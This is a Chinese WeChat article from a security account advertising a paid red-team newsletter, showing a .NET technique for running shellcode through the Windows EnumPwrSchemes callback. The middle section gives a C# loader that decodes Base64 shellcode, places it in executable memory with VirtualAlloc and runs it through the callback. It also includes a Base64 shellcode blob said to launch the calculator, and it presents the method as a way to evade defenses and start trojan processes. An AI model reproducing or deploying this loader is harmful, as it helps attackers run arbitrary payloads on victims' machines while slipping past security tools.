---
title: .NET内网实战：通过回调函数执行Shellcode
url: https://mp.weixin.qq.com/s?__biz=MzUyOTc3NTQ5MA==&mid=2247494748&idx=1&sn=099543717722e33c062003cccfb9092f&chksm=fa5942b1cd2ecba751237815b12e5878938133d9ca848f9e03d18c79ac888555de0de0798b3d&scene=58&subscene=0#rd
source: dotNet安全矩阵
date: 2024-08-26
fetch_date: 2025-10-06T18:02:17.817158
---

# .NET内网实战：通过回调函数执行Shellcode

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1Yib7WFgAIepLra3Ehq07bQy3zpxsbtLibjXjWrHVp0swfdCTscDXmkfImVMt1ZP8BR9XjZYEIKQr3CQ/0?wx_fmt=jpeg)

# .NET内网实战：通过回调函数执行Shellcode

原创

专攻.NET安全的

dotNet安全矩阵

01

阅读须知

此文所节选自小报童《.NET 内网实战攻防》专栏，主要内容有.NET在各个内网渗透阶段与Windows系统交互的方式和技巧，对内网和后渗透感兴趣的朋友们可以订阅该电子报刊，解锁更多的报刊内容。

02

基本介绍

本文内容部分节选自小报童《.NET 通过回调函数执行Shellcode启动进程》，完整的文章内容请加入小报童后订阅查看。现在限时只需59元，永久买断！目前已有200+位朋友抢先预定，我们会长期更新，对.NET内网安全的朋友们请尽快订阅该报刊！

![](https://mmbiz.qpic.cn/mmbiz_png/NO8Q9ApS1Yib7WFgAIepLra3Ehq07bQy3vqpl9dOAT8dFicar1qiaLsHWEGVl8f76gzW2AhzczqHKNaRkKp86rwKg/640?wx_fmt=png&from=appmsg)

03

编码实现

在红队活动往往需要考虑如何在实际环境中绕过防御机制，启动木马进程。今天，我们将深入探讨一种较少被提及但非常有趣的技术—利用 EnumPwrSchemes 函数回调来执行Shellcode。

## 3.1 EnumPwrSchemes函数

EnumPwrSchemes 是 Windows 操作系统中的一个 API 函数，位于 C:\Windows\System32\powrprof.dll 库中，用于枚举系统中的电源配置，可以控制计算机的电源使用策略，比如休眠、关闭硬盘、显示器等。EnumPwrSchemes 函数原型如下所示。

```
BOOLEAN EnumPwrSchemes(
  PWRSCHEMESENUMPROC lpfn,
  LPARAM             lParam
);
```

接受一个回调函数和一个参数指针，其中，lpfn参数是一个指向回调函数的指针，该回调函数用于处理每个电源配置的详细信息，另一个参数lParam，是一个自定义参数，类型为 LPARAM，它会被传递给回调函数，通常用于传递上下文信息，每当找到一个系统电源配置时，会自动调用该函数。

## 3.2 EnumPwrSchemes函数

下面这个代码片段展示了如何在.NET中使用 VirtualAlloc 和 EnumPwrSchemes 函数协同完成执行Shellcode启动计算器进程。

```
string base64Content = args[0];
byte[] shellcode = Convert.FromBase64String(base64Content);
IntPtr addr = VirtualAlloc(IntPtr.Zero, shellcode.Length, 0x3000, 0x40);
Marshal.Copy(shellcode, 0, addr, shellcode.Length);
EnumPwrSchemes(addr, IntPtr.Zero);
```

上述代码中首先，从命令行参数中获取 Base64 编码的 Shellcode，这里使用启动本地计算器的Shellcode，具体如下所示。

```
/OiCAAAAYInlMcBki1Awi1IMi1IUi3IoD7dKJjH/rDxhfAIsIMHPDQHH4vJSV4tSEItKPItMEXjjSAHRUYtZIAHTi0kY4zpJizSLAdYx/6zBzw0BxzjgdfYDffg7fSR15FiLWCQB02aLDEuLWBwB04sEiwHQiUQkJFtbYVlaUf/gX19aixLrjV1qAY2FsgAAAFBoMYtvh//Vu/C1olZoppW9nf/VPAZ8CoD74HUFu0cTcm9qAFP/1WNhbGMuZXhlAA==
```

综上，通过使用 EnumPwrSchemes 等 Windows API 函数，攻击者可以隐藏并执行恶意代码。想要了解完整或者更多的内网安全防御绕过方向的文章，可以移步订阅小报童《.NET 内网实战攻防》电子报刊。

04

**欢迎加入.NET 电子报刊**

我们的小报童电子报刊【.NET内网安全攻防】也开始运营，引入小报童也是为了弥补知识星球对于轻量级阅读支持的不足，为用户读者提供更佳的阅读体验。如果您对阅读体验的需求比较高，那么可以订阅这个专栏。

本次电子报刊《.NET 内网安全攻防》专栏，内容主要有.NET在各个内网渗透阶段与Windows系统交互的方式和技巧，可细分为以下8个方向。

```
1） .NET 安全防御绕过
2） .NET 本地权限提升
3） .NET 内网信息收集
4） .NET 内网代理通道
5） .NET 内网横向移动
6） .NET 目标权限维持
7） .NET 数据传输外发
8） .NET 目标痕迹清理
```

原价899，现在限时只需59元，永久买断！目前已有200+位朋友抢先预定，我们会长期更新，初步计划保持每周更新1-2篇新内容，对.NET内网安全的朋友们请尽快订阅该报刊！![](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1YibeicvDNVldcXTgRnFUFTwOqfTleogJThU7kCaZJuuU2BLVLYluu6CFV7BX458AxBcd93ickZ0rmOqQ/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp)

每增加五十人涨价10元，抓紧订阅，超值！订阅后请关注公众号：dotNet安全矩阵，发送订单截图和您的微信号，邀请您加入专属交流群。感兴趣的朋友，可以点击链接：https://xiaobot.net/p/dotNetAttack，或者扫描下方海报微信二维码加入即可，订阅后小报童定时会将最新内容通过微信推送给您。

![](https://mmbiz.qpic.cn/mmbiz_png/NO8Q9ApS1Yib7WFgAIepLra3Ehq07bQy37Vdkd553TGKibLkzUicJyKiaXRFPiaGk9RIC4e5XuSx8XcHkOiaL77xuqGQ/640?wx_fmt=png&from=appmsg)

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/NO8Q9ApS1Y8uc3CokHvGlrE00icPjW7AdTgEXkDtRT81Bbiaibx9gpMD6thAiawO5vz0icNlUzrzaOf6g044Tnzv3sQ/0?wx_fmt=png)

dotNet安全矩阵

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/NO8Q9ApS1Y8uc3CokHvGlrE00icPjW7AdTgEXkDtRT81Bbiaibx9gpMD6thAiawO5vz0icNlUzrzaOf6g044Tnzv3sQ/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过